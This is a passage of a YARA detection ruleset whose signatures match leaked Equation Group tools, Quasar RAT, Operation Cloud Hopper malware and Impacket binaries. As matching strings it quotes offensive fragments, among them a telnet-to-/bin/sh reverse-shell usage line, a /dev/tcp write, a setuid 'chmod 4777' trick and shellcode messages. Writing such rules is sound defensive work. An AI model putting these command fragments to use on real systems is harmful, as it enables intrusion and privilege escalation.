      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:07:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%x:%d  --> %x:%d %d bytes" fullword ascii
      $s1 = "client: can't bind to local address, are you root?" fullword ascii
      $s2 = "Unable to register port" fullword ascii
      $s3 = "Could not resolve destination" fullword ascii
      $s4 = "raw troubles" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )
} 

rule EquationGroup_parsescan_RID3083 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file parsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\s+version/) or" fullword ascii
      $s2 = "Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_jscan_RID2ED2 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jscan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$scanth = $scanth . \" -s \" . $scanthreads;" fullword ascii
      $s2 = "print \"java -jar jscanner.jar$scanth$list\\n\";" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_promptkill_RID3111 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file promptkill"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:06:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "exec(\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\");" fullword ascii
      $x2 = "$xargs=\"-title \\\"Kill process $pid?\\\" -name \\\"Kill process $pid?\\\" -bg white -fg red -geometry 202x19+0+0\" ;" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_epoxyresin_v1_0_0_RID333D : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 14:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] kernel not vulnerable" fullword ascii
      $s1 = ".tmp.%d.XXXXXX" fullword ascii
      $s2 = "[-] couldn't create temp file" fullword ascii
      $s3 = "/boot/System.map-%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )
} 

rule EquationGroup_estopmoonlit_RID31F0 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file estopmoonlit"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] shellcode prepared, re-executing" fullword ascii
      $x2 = "[-] kernel not vulnerable: prctl" fullword ascii
      $x3 = "[-] shell failed" fullword ascii
      $x4 = "[!] selinux apparently enforcing.  Continue [y|n]? " fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_envoytomato_RID3188 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file envoytomato"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:26:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[-] kernel not vulnerable" fullword ascii
      $s2 = "[-] failed to spawn shell" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_smash_RID2EDF : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file smash"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:33:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "T=<target IP> [O=<port>] Y=<target type>" fullword ascii
      $x2 = "no command given!! bailing..." fullword ascii
      $x3 = "no port. assuming 22..." fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_ratload_RID2FAA : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ratload"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "/tmp/ratload.tmp.sh" fullword ascii
      $x2 = "Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\"" fullword ascii
      $s6 = "uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_ys_RID2DAF : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ys.auto"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 10:42:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"" fullword ascii
      $x3 = "DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`" fullword ascii
      $x4 = "FATAL ERROR: -x port and -n port MUST NOT BE THE SAME." fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_ewok_RID2E79 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ewok"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:16:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Example: ewok -t target public" fullword ascii
      $x2 = "Usage:  cleaner host community fake_prog" fullword ascii
      $x3 = "-g  - Subset of -m that Green Spirit hits " fullword ascii
      $x4 = "--- ewok version" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them )
} 

rule EquationGroup_xspy_RID2E97 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file xspy"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "USAGE: xspy -display <display> -delay <usecs> -up" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )
} 

rule EquationGroup_estesfox_RID3034 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file estesfox"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron" fullword ascii
   condition: 
      all of them
} 

rule EquationGroup_elatedmonkey_1_0_1_1_RID3404 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file elatedmonkey.1.0.1.1.sh"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 15:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x3 = "Usage: $0 ( -s IP PORT | CMD )" fullword ascii
      $s5 = "os.execl(\"/bin/sh\", \"/bin/sh\", \"-c\", \"$CMD\")" fullword ascii
      $s13 = "PHP_SCRIPT=\"$HOME/public_html/info$X.php\"" fullword ascii
      $s15 = "cat > /dev/tcp/127.0.0.1/80 <<END" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 5KB and ( 1 of ( $x* ) and 5 of ( $s* ) ) ) or ( all of them )
} 

rule EquationGroup_scanner_RID2FAD : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file scanner"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:07:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "program version netid     address             service         owner" fullword ascii
      $x4 = "*** Sorry about the raw output, I'll leave it for now" fullword ascii
      $x5 = "-scan winn %s one" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup__ftshell_ftshell_v3_10_3_0_RID364E : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "set uRemoteUploadCommand \"[exec cat /current/.ourtn-ftshell-upcommand]\"" fullword ascii
      $s2 = "send \"\\[ \\\"\\$BASH\\\" = \\\"/bin/bash\\\" -o \\\"\\$SHELL\\\" = \\\"/bin/bash\\\" \\] &&" ascii
      $s3 = "system rm -f /current/tmp/ftshell.latest" fullword ascii
      $s4 = "# ftshell -- File Transfer Shell" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 1 of them ) or ( 2 of them )
} 

rule EquationGroup__scanner_scanner_v2_1_2_RID357D : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:15:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Welcome to the network scanning tool" fullword ascii
      $s2 = "Scanning port %d" fullword ascii
      $s3 = "/current/down/cmdout/scans" fullword ascii
      $s4 = "Scan for SSH version" fullword ascii
      $s5 = "program vers proto   port  service" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )
} 

rule EquationGroup__ghost_sparc_ghost_x86_3_RID361A : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:41:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target" fullword ascii
      $x2 = "Sending shellcode as part of an open command..." fullword ascii
      $x3 = "cmdshellcode" fullword ascii
      $x4 = "You will not be able to run the shellcode. Exiting..." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )
} 

rule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4_RID3748 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 17:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
      $s2 = "e.g.: -n 1-1024,1080,6666,31337 " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and all of them )
} 

rule EquationGroup__jparsescan_parsescan_5_RID35FF : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "# default is to dump out all scanned hosts found" fullword ascii
      $s2 = "$bool .= \" -r \" if (/mibiisa.* -r/);" fullword ascii
      $s3 = "sadmind is available on two ports, this also works)" fullword ascii
      $s4 = "-x IP      gives \\\"hostname:# users:load ...\\\" if positive xwin scan" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 40KB and 1 of them ) or ( 2 of them )
} 

rule EquationGroup__funnelout_v4_1_0_1_RID33BA : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files funnelout.v4.1.0.1.pl"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 15:00:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "header(\"Set-Cookie: bbsessionhash=\" . \\$hash . \"; path=/; HttpOnly\");" fullword ascii
      $s2 = "if ($code =~ /proxyhost/) {" fullword ascii
      $s3 = "\\$rk[1] = \\$rk[1] - 1;" fullword ascii
      $s4 = "#existsUser($u) or die \"User '$u' does not exist in database.\\n\";" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
} 

rule EquationGroup__magicjack_v1_1_0_0_client_RID364E : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "temp = ((left >> 1) ^ right) & 0x55555555" fullword ascii
      $s2 = "right ^= (temp <<  16) & 0xffffffff" fullword ascii
      $s3 = "tempresult = \"\"" fullword ascii
      $s4 = "num = self.bytes2long(data)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 80KB and 3 of them ) or ( all of them )
} 

rule EquationGroup__ftshell_RID3014 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if { [string length $uRemoteUploadCommand]" fullword ascii
      $s2 = "processUpload" fullword ascii
      $s3 = "global dothisreallyquiet" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
} 

rule Quasar_RAT_1_RID2B54 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Quasar RAT"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"
      date = "2017-04-07 09:01:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "DoUploadAndExecute" fullword ascii
      $s2 = "DoDownloadAndExecute" fullword ascii
      $s3 = "DoShellExecute" fullword ascii
      $s4 = "set_Processname" fullword ascii
      $op1 = { 04 1e fe 02 04 16 fe 01 60 } 
      $op2 = { 00 17 03 1f 20 17 19 15 28 } 
      $op3 = { 00 04 03 69 91 1b 40 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of ( $s* ) or all of ( $op* ) )
} 

rule Quasar_RAT_2_RID2B55 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Quasar RAT"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"
      date = "2017-04-07 09:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "GetKeyloggerLogsResponse" fullword ascii
      $x2 = "get_Keylogger" fullword ascii
      $x3 = "HandleGetKeyloggerLogsResponse" fullword ascii
      $s1 = "DoShellExecuteResponse" fullword ascii
      $s2 = "GetPasswordsResponse" fullword ascii
      $s3 = "GetStartupItemsResponse" fullword ascii
      $s4 = "<GetGenReader>b__7" fullword ascii
      $s5 = "RunHidden" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and $x1 ) or ( all of them )
} 

rule Malware_Floxif_mpsvc_dll_RID30C4 : DEMO EXE FILE MAL T1086 {
   meta:
      description = "Malware - Floxif"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-04-07 12:53:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1086"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 04 80 7a 03 01 75 04 8d 42 04 c3 8d 42 04 53 8b } 
      $op2 = { 88 19 74 03 41 eb ea c6 42 03 01 5b c3 8b 4c 24 } 
      $op3 = { ff 03 8d 00 f9 ff ff 88 01 eb a1 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule OpCloudHopper_WmiDLL_inMemory_RID324C : APT DEMO T1136 {
   meta:
      description = "Malware related to Operation Cloud Hopper - Page 25"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"
      date = "2017-04-07 13:59:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wmi.dll 2>&1" ascii
   condition: 
      all of them
} 

rule OpCloudHopper_lockdown_RID2FF5 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Tools related to Operation Cloud Hopper"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "lockdown.dll" fullword ascii
      $s3 = "mfeann.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule OpCloudHopper_WindowXarBot_RID315C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Malware related to Operation Cloud Hopper"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"
      date = "2017-04-07 13:19:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Release\\WindowXarbot.pdb" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule VBS_WMIExec_Tool_Apr17_1_RID2F44 : APT DEMO SCRIPT T1136 {
   meta:
      description = "Tools related to Operation Cloud Hopper"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, SCRIPT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "strNetUse = \"cmd.exe /c net use \\\\\" & host" fullword ascii
      $x2 = "localcmd = \"cmd.exe /c \" & command " ascii
      $x3 = "& \" > \" & TempFile & \" 2>&1\"  '2>&1 err" fullword ascii
      $x4 = "strExec = \"cmd.exe /c \" & cmd & \" >> \" & resultfile & \" 2>&1\"  '2>&1 err" fullword ascii
      $x5 = "TempFile = objShell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\wmi.dll\"" fullword ascii
      $a1 = "WMIEXEC ERROR: Command -> " ascii
      $a2 = "WMIEXEC : Command result will output to" fullword ascii
      $a3 = "WMIEXEC : Target ->" fullword ascii
      $a4 = "WMIEXEC : Login -> OK" fullword ascii
      $a5 = "WMIEXEC : Process created. PID:" fullword ascii
   condition: 
      ( filesize < 40KB and 1 of them ) or 3 of them
} 

rule Impacket_Tools_mmcexec_RID2FF0 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:18:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "smmcexec" fullword ascii
      $s2 = "\\yzHPlU=QA" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 16000KB and all of them )
} 

rule Impacket_Tools_ifmap_RID2F1B : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 11:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "bifmap.exe.manifest" fullword ascii
      $s2 = "impacket.dcerpc.v5.epm(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )
} 

rule karmaSMB_RID29FF : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 02:50:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "bkarmaSMB_RID29FF.exe.manifest" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule samrdump_RID2A7A : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 06:15:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "bsamrdump_RID2A7A.exe.manifest" fullword ascii
      $s3 = "ssamrdump_RID2A7A" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_rpcdump_RID3009 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "srpcdump" fullword ascii
      $s2 = "impacket.dcerpc.v5.epm(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_secretsdump_RID31BD : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 13:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ssecretsdump" fullword ascii
      $s2 = "impacket.ese(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_esentutl_RID3082 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:42:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket.ese(" fullword ascii
      $s2 = "sesentutl" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 11000KB and all of them )
} 

rule Impacket_Tools_opdump_RID2FA3 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:05:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "bopdump.exe.manifest" fullword ascii
      $s3 = "sopdump" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_sniff_RID2F24 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 11:44:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ssniff" fullword ascii
      $s2 = "impacket.eap(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )
} 

rule Impacket_Tools_smbexec_RID2FF5 : DEMO EXE FILE HKTL T1136 {
   meta:
